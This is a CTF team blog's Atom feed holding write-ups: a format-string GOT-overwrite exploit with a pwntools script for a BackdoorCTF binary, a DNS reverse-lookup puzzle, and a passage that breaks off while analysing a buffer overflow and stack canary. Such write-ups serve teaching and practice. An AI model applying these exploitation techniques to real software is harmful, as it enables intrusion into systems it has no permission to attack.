<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-10-05T19:58:05+01:00</updated><id>http://localhost:4000/</id><title type="html">crackchester.github.io</title><subtitle>Main website</subtitle><entry><title type="html">baby-0x41414141</title><link href="http://localhost:4000/backdoorctf%202017/baby-0x41414141.html" rel="alternate" type="text/html" title="baby-0x41414141" /><published>2017-09-27T21:35:05+01:00</published><updated>2017-09-27T21:35:05+01:00</updated><id>http://localhost:4000/backdoorctf%202017/baby-0x41414141</id><content type="html" xml:base="http://localhost:4000/backdoorctf%202017/baby-0x41414141.html">&lt;p&gt;We download a file which is a 32bit ELF binary.&lt;/p&gt;

&lt;p&gt;We take a look at it’s main function using radare2.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/ (fcn) sym.main 214
|   sym.main ();
|           ; var int local_20ch @ ebp-0x20c
|           ; var int local_200h @ ebp-0x200
|           ; var int local_138h @ ebp-0x138
|           ; var int local_ch @ ebp-0xc
|           ; var int local_4h @ esp+0x4
|              ; DATA XREF from 0x08048627 (entry0)
|           0x08048724      8d4c2404       lea ecx, [local_4h]         ; eflags
|           0x08048728      83e4f0         and esp, 0xfffffff0
|           0x0804872b      ff71fc         push dword [ecx - 4]
|           0x0804872e      55             push ebp
|           0x0804872f      89e5           mov ebp, esp
|           0x08048731      51             push ecx
|           0x08048732      81ec14020000   sub esp, 0x214
|           0x08048738      89c8           mov eax, ecx
|           0x0804873a      8b4004         mov eax, dword [eax + 4]    ; eflags ; [0x4:4]=0x10101
|           0x0804873d      8985f4fdffff   mov dword [local_20ch], eax
|           0x08048743      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=1
|           0x08048749      8945f4         mov dword [local_ch], eax
|           0x0804874c      31c0           xor eax, eax
|           0x0804874e      83ec0c         sub esp, 0xc
|           0x08048751      68f0880408     push str.Hello_baby_pwner__whats_your_name_ ; 0x80488f0 ; &quot;Hello baby pwner, whats your name?&quot; ; const char * s
|           0x08048756      e885feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0804875b      83c410         add esp, 0x10
|           0x0804875e      a144a00408     mov eax, dword obj.stdout   ; [0x804a044:4]=0x62552820 ; &quot; (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609&quot;
|           0x08048763      83ec0c         sub esp, 0xc
|           0x08048766      50             push eax                    ; FILE *stream
|           0x08048767      e854feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
|           0x0804876c      83c410         add esp, 0x10
|           0x0804876f      a140a00408     mov eax, dword obj.stdin    ; loc.stdin ; [0x804a040:4]=0x3a434347 ; &quot;GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609&quot;
|           0x08048774      bac8000000     mov edx, 0xc8
|           0x08048779      83ec04         sub esp, 4
|           0x0804877c      50             push eax
|           0x0804877d      52             push edx
|           0x0804877e      8d8500feffff   lea eax, [local_200h]
|           0x08048784      50             push eax                    ; char *s
|           0x08048785      e806feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x0804878a      83c410         add esp, 0x10
|           0x0804878d      a140a00408     mov eax, dword obj.stdin    ; loc.stdin ; [0x804a040:4]=0x3a434347 ; &quot;GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609&quot;
|           0x08048792      83ec0c         sub esp, 0xc
|           0x08048795      50             push eax                    ; FILE *stream
|           0x08048796      e825feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
|           0x0804879b      83c410         add esp, 0x10
|           0x0804879e      83ec04         sub esp, 4
|           0x080487a1      8d8500feffff   lea eax, [local_200h]
|           0x080487a7      50             push eax
|           0x080487a8      6814890408     push str.Ok_cool__soon_we_will_know_whether_you_pwned_it_or_not._Till_then_Bye__s ; 0x8048914 ; &quot;Ok cool, soon we will know whether you pwned it or not. Till then Bye %s&quot;
|           0x080487ad      8d85c8feffff   lea eax, [local_138h]
|           0x080487b3      50             push eax                    ; char *s
|           0x080487b4      e897fdffff     call sym.imp.sprintf        ; int sprintf(char *s,
|           0x080487b9      83c410         add esp, 0x10
|           0x080487bc      a144a00408     mov eax, dword obj.stdout   ; [0x804a044:4]=0x62552820 ; &quot; (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609&quot;
|           0x080487c1      83ec0c         sub esp, 0xc
|           0x080487c4      50             push eax                    ; FILE *stream
|           0x080487c5      e8f6fdffff     call sym.imp.fflush         ; int fflush(FILE *stream)
|           0x080487ca      83c410         add esp, 0x10
|           0x080487cd      83ec0c         sub esp, 0xc
|           0x080487d0      8d85c8feffff   lea eax, [local_138h]
|           0x080487d6      50             push eax                    ; const char * format
|           0x080487d7      e8f4fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x080487dc      83c410         add esp, 0x10
|           0x080487df      a144a00408     mov eax, dword obj.stdout   ; [0x804a044:4]=0x62552820 ; &quot; (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609&quot;
|           0x080487e4      83ec0c         sub esp, 0xc
|           0x080487e7      50             push eax                    ; FILE *stream
|           0x080487e8      e8d3fdffff     call sym.imp.fflush         ; int fflush(FILE *stream)
|           0x080487ed      83c410         add esp, 0x10
|           0x080487f0      83ec0c         sub esp, 0xc
|           0x080487f3      6a01           push 1                      ; int status
\           0x080487f5      e8f6fdffff     call sym.imp.exit           ; void exit(int status)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;A fairly simple program that’s vulnerable to a format string attack.&lt;/p&gt;

&lt;p&gt;But we can’t overflow any buffers and there don’t appear to be any interesting variables on the stack. Overwriting the return address doesn’t make much sense since &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; calls &lt;code class=&quot;highlighter-rouge&quot;&gt;exit&lt;/code&gt;. So what do we do?&lt;/p&gt;

&lt;p&gt;We mess with the plt table!&lt;/p&gt;

&lt;p&gt;Let’s look at &lt;code class=&quot;highlighter-rouge&quot;&gt;exit@plt&lt;/code&gt; using &lt;code class=&quot;highlighter-rouge&quot;&gt;objdump&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;080485f0 &amp;lt;exit@plt&amp;gt;:
 80485f0:       ff 25 34 a0 04 08       jmp    *0x804a034
 80485f6:       68 50 00 00 00          push   $0x50
 80485fb:       e9 40 ff ff ff          jmp    8048540 &amp;lt;.plt&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We can see that the process jumps to whatever address is stored at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x804a034&lt;/code&gt; when &lt;code class=&quot;highlighter-rouge&quot;&gt;exit&lt;/code&gt; is called. We can abuse this to modify the flow of execution.&lt;/p&gt;

&lt;p&gt;By skimming a bit through the output of objdump, we can actually find a function that outputs the flag:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0804870b &amp;lt;_Z4flagv&amp;gt;:
 804870b:       55                      push   %ebp
 804870c:       89 e5                   mov    %esp,%ebp
 804870e:       83 ec 08                sub    $0x8,%esp
 8048711:       83 ec 0c                sub    $0xc,%esp
 8048714:       68 e0 88 04 08          push   $0x80488e0
 8048719:       e8 52 fe ff ff          call   8048570 &amp;lt;system@plt&amp;gt;
 804871e:       83 c4 10                add    $0x10,%esp
 8048721:       90                      nop
 8048722:       c9                      leave
 8048723:       c3                      ret
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;All we need to do is to redirect the execution to that function and we solved the challenge.&lt;/p&gt;

&lt;p&gt;We can achieve this by pushing the address of the jump location(&lt;code class=&quot;highlighter-rouge&quot;&gt;0x804a034&lt;/code&gt;) on the stack by passing it as part of an argument to &lt;code class=&quot;highlighter-rouge&quot;&gt;sprintf&lt;/code&gt;. We then make sure that &lt;code class=&quot;highlighter-rouge&quot;&gt;sprintf&lt;/code&gt; prints &lt;code class=&quot;highlighter-rouge&quot;&gt;0804870b&lt;/code&gt; characters, before encountering &lt;code class=&quot;highlighter-rouge&quot;&gt;%n&lt;/code&gt; in the passed string.&lt;/p&gt;

&lt;p&gt;The desired jump location is a fairly big number, so we actually split it up into two writes in our exploit by using &lt;code class=&quot;highlighter-rouge&quot;&gt;%hn&lt;/code&gt; and passing two addresses in the string.&lt;/p&gt;

&lt;p&gt;We determined the right “parameter number” by using the following small shellscript:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;seq 1 100&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;;
&lt;span class=&quot;k&quot;&gt;do
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;
        ./32_new &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;AAAA%&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;p&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;All you need to do is to watch for &lt;code class=&quot;highlighter-rouge&quot;&gt;0x41414141&lt;/code&gt; in the output.&lt;/p&gt;

&lt;p&gt;And ended up with this solution:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'163.172.176.29'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9035&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fromhex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0804a034&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[::&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fromhex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0804a036&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[::&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;padding1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x870b&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;padding2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0804&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# sprintf already prints 70 characters&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;x&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%11&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$hn&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;x&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%10&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$hn&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ascii&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;That’s it!&lt;/p&gt;</content><author><name>3553x</name></author><category term="BackdoorCTF 2017" /><summary type="html">We download a file which is a 32bit ELF binary.</summary></entry><entry><title type="html">DigDug</title><link href="http://localhost:4000/asis%20finals%202017/DigDug.html" rel="alternate" type="text/html" title="DigDug" /><published>2017-09-20T04:15:07+01:00</published><updated>2017-09-20T04:15:07+01:00</updated><id>http://localhost:4000/asis%20finals%202017/DigDug</id><content type="html" xml:base="http://localhost:4000/asis%20finals%202017/DigDug.html">&lt;p&gt;We are given a link to a simple static website &lt;code class=&quot;highlighter-rouge&quot;&gt;digx.asisctf.com&lt;/code&gt;.
The name and the description of the challenge all hint at the use of &lt;code class=&quot;highlighter-rouge&quot;&gt;dig -x&lt;/code&gt;, which performs a reverse lookup.
So we obtain the IP of the server by using dig.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.11.1-P1 &amp;lt;&amp;lt;&amp;gt;&amp;gt; digx.asisctf.com
;; global options: +cmd
;; Got answer:
;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 42490
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;digx.asisctf.com.              IN      A

;; ANSWER SECTION:
digx.asisctf.com.       300     IN      A       192.81.223.250

;; Query time: 275 msec
;; SERVER: 192.168.1.254#53(192.168.1.254)
;; WHEN: Wed Sep 20 04:21:27 BST 2017
;; MSG SIZE  rcvd: 61
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;We now perform a reverse lookup with &lt;code class=&quot;highlighter-rouge&quot;&gt;dig -x&lt;/code&gt; which reveals the domain &lt;code class=&quot;highlighter-rouge&quot;&gt;airplane.asisctf.com&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We attempt to access the domain via our browser, follow the instructions to enter offline mode and obtain the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/asis-airplane.jpg&quot; alt=&quot;A screenshot of the website&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ASIS{&lt;em&gt;just_Go_Offline_When_you_want_to_be_creative&lt;/em&gt;!}&lt;/p&gt;</content><author><name>3553x</name></author><category term="ASIS Finals 2017" /><summary type="html">We are given a link to a simple static website digx.asisctf.com. The name and the description of the challenge all hint at the use of dig -x, which performs a reverse lookup. So we obtain the IP of the server by using dig.</summary></entry><entry><title type="html">mary_morton</title><link href="http://localhost:4000/asis%20finals%202017/mary_morton.html" rel="alternate" type="text/html" title="mary_morton" /><published>2017-09-19T00:50:07+01:00</published><updated>2017-09-19T00:50:07+01:00</updated><id>http://localhost:4000/asis%20finals%202017/mary_morton</id><content type="html" xml:base="http://localhost:4000/asis%20finals%202017/mary_morton.html">&lt;p&gt;We determine that the downloaded file is a xz compressed tar archive by using the UNIX &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; utility.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mary_morton_f3555213d54602a8e5a40fe0435adcf84e8eff71: XZ compressed data
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tar xvf&lt;/code&gt; reveals a 64bit ELF for Linux.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mary_morton: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Let’s take a look at the file in radare2.&lt;/p&gt;

&lt;p&gt;This is the main function:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/ (fcn) main 180
|   main ();
|           ; var int local_28h @ rbp-0x28
|           ; var int local_20h @ rbp-0x20
|           ; var int local_14h @ rbp-0x14
|           ; var int local_ch @ rbp-0xc
|           ; var int local_8h @ rbp-0x8
|              ; DATA XREF from 0x0040074d (entry0)
|           0x00400826      55             push rbp
|           0x00400827      4889e5         mov rbp, rsp
|           0x0040082a      4883ec30       sub rsp, 0x30               ; '0'
|           0x0040082e      897dec         mov dword [local_14h], edi
|           0x00400831      488975e0       mov qword [local_20h], rsi
|           0x00400835      488955d8       mov qword [local_28h], rdx
|           0x00400839      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x11a8 ; '('
|           0x00400842      488945f8       mov qword [local_8h], rax
|           0x00400846      31c0           xor eax, eax
|           0x00400848      b800000000     mov eax, 0
|           0x0040084d      e8ad010000     call sub.setvbuf_9ff        ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
|           0x00400852      bfd40a4000     mov edi, str.Welcome_to_the_battle__ ; 0x400ad4 ; &quot;Welcome to the battle ! &quot; ; const char * s
|           0x00400857      e824feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0040085c      bfed0a4000     mov edi, str._Great_Fairy__level_pwned ; 0x400aed ; &quot;[Great Fairy] level pwned &quot; ; const char * s
|           0x00400861      e81afeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400866      bf080b4000     mov edi, str.Select_your_weapon ; 0x400b08 ; &quot;Select your weapon &quot; ; const char * s
|           0x0040086b      e810feffff     call sym.imp.puts           ; int puts(const char *s)
|              ; JMP XREF from 0x004008d8 (main)
|       .-&amp;gt; 0x00400870      b800000000     mov eax, 0
|       |   0x00400875      e860010000     call sub.puts_9da           ; int puts(const char *s)
|       |   0x0040087a      488d45f4       lea rax, qword [local_ch]
|       |   0x0040087e      4889c6         mov rsi, rax                ; void *buf
|       |   0x00400881      bf1c0b4000     mov edi, 0x400b1c           ; int fildes
|       |   0x00400886      b800000000     mov eax, 0
|       |   0x0040088b      e870feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
|       |   0x00400890      8b45f4         mov eax, dword [local_ch]
|       |   0x00400893      83f802         cmp eax, 2
|      ,==&amp;lt; 0x00400896      7416           je 0x4008ae
|      ||   0x00400898      83f803         cmp eax, 3
|     ,===&amp;lt; 0x0040089b      741d           je 0x4008ba
|     |||   0x0040089d      83f801         cmp eax, 1
|    ,====&amp;lt; 0x004008a0      752c           jne 0x4008ce
|    ||||   0x004008a2      b800000000     mov eax, 0
|    ||||   0x004008a7      e8b4000000     call sub.read_960           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|   ,=====&amp;lt; 0x004008ac      eb2a           jmp 0x4008d8
|   |||`--&amp;gt; 0x004008ae      b800000000     mov eax, 0
|   ||| |   0x004008b3      e833000000     call sub.read_8eb           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|   |||,==&amp;lt; 0x004008b8      eb1e           jmp 0x4008d8
|   ||`---&amp;gt; 0x004008ba      bf1f0b4000     mov edi, str.Bye            ; 0x400b1f ; &quot;Bye &quot; ; const char * s
|   || ||   0x004008bf      e8bcfdffff     call sym.imp.puts           ; int puts(const char *s)
|   || ||   0x004008c4      bf00000000     mov edi, 0                  ; int status
|   || ||   0x004008c9      e842feffff     call sym.imp.exit           ; void exit(int status)
|   |`----&amp;gt; 0x004008ce      bf240b4000     mov edi, str.Wrong_         ; 0x400b24 ; &quot;Wrong!&quot; ; const char * s
|   |  ||   0x004008d3      e8a8fdffff     call sym.imp.puts           ; int puts(const char *s)
|   |  ||      ; JMP XREF from 0x004008b8 (main)
|   |  ||      ; JMP XREF from 0x004008ac (main)
\   `--``=&amp;lt; 0x004008d8      eb96           jmp 0x400870
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The function &lt;code class=&quot;highlighter-rouge&quot;&gt;sub.puts_9da&lt;/code&gt; informs us of our options: A format string attack and a buffer overflow.
Note that the program ends a loop and we can thus call an arbitrary combination of these functions.&lt;/p&gt;

&lt;p&gt;Let’s take a look at the buffer overflow:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/ (fcn) sub.read_960 122
|   sub.read_960 ();
|           ; var int local_90h @ rbp-0x90
|           ; var int local_8h @ rbp-0x8
|              ; CALL XREF from 0x004008a7 (main)
|           0x00400960      55             push rbp
|           0x00400961      4889e5         mov rbp, rsp
|           0x00400964      4881ec900000.  sub rsp, 0x90
|           0x0040096b      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x11a8 ; '('
|           0x00400974      488945f8       mov qword [local_8h], rax
|           0x00400978      31c0           xor eax, eax
|           0x0040097a      488d9570ffff.  lea rdx, qword [local_90h]
|           0x00400981      b800000000     mov eax, 0
|           0x00400986      b910000000     mov ecx, 0x10
|           0x0040098b      4889d7         mov rdi, rdx
|           0x0040098e      f348ab         rep stosq qword [rdi], rax
|           0x00400991      488d8570ffff.  lea rax, qword [local_90h]
|           0x00400998      ba00010000     mov edx, 0x100              ; size_t nbyte
|           0x0040099d      4889c6         mov rsi, rax                ; void *buf
|           0x004009a0      bf00000000     mov edi, 0                  ; int fildes
|           0x004009a5      e826fdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x004009aa      488d8570ffff.  lea rax, qword [local_90h]
|           0x004009b1      4889c6         mov rsi, rax
|           0x004009b4      bf3b0b4000     mov edi, str.____s_n        ; 0x400b3b ; &quot;-&amp;gt; %s\n&quot; ; const char * format
|           0x004009b9      b800000000     mov eax, 0
|           0x004009be      e8edfcffff     call sym.imp.printf         ; int printf(const char *format)
|           0x004009c3      90             nop
|           0x004009c4      488b45f8       mov rax, qword [local_8h]
|           0x004009c8      644833042528.  xor rax, qword fs:[0x28]
|       ,=&amp;lt; 0x004009d1      7405           je 0x4009d8
|       |   0x004009d3      e8b8fcffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       `-&amp;gt; 0x004009d8      c9             leave
\           0x004009d9      c3             ret
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Only 0x90 bytes are allocated on the stack, however the call to &lt;code class=&quot;highlighter-rouge&quot;&gt;read&lt;/code&gt; accepts up to 0x100 bytes and saves them on the stack.
We can thus overwrite 0x10 bytes of memory which corresponds to exactly two 64bit addresses.
In our case, that would be the saved base pointer and the return address, how convenient!&lt;/p&gt;

&lt;p&gt;Our only problem is the stack canary, we would overwrite it and trigger the check at the end of the function and of course the question of what address we should return to also remains open.&lt;/p&gt;

&lt;p&gt;Time to look at the format string attack!&lt;/p&gt;

&lt;h3 id=&quot;recovering-the-canary&quot;&gt;Recovering the Canary&lt;/h3&gt;

